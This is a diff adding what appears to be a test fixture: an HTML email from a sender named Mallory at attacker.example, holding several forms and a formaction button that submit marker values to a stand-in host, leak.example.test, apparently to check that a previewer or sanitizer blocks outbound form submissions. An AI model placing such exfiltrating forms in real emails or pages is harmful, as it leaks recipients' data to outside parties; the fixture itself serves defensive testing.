@@ -1,0 +1,8 @@
+From: Mallory <mallory@attacker.example>
+To: admin@example.test
+Subject: Forms
+Date: Mon, 09 Nov 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head><title>Forms</title></head><body><p>Forms that send.</p><form action="https://leak.example.test/form" method="post"><input name="q" value="MARKER-FORM"><button type="submit">Send away</button></form><form action="/api/session" method="post"><input name="email" value="x"><button type="submit">Send here</button></form><form><input name="r" value="y"><button type="submit">Send to the preview</button></form><form action="https://leak.example.test/get" method="get" target="_top"><button type="submit">Send to the top</button></form><form action="https://leak.example.test/blank" target="_blank"><button>Send to a window</button></form><button form="outside" formaction="https://leak.example.test/formaction">Form action</button></body></html>
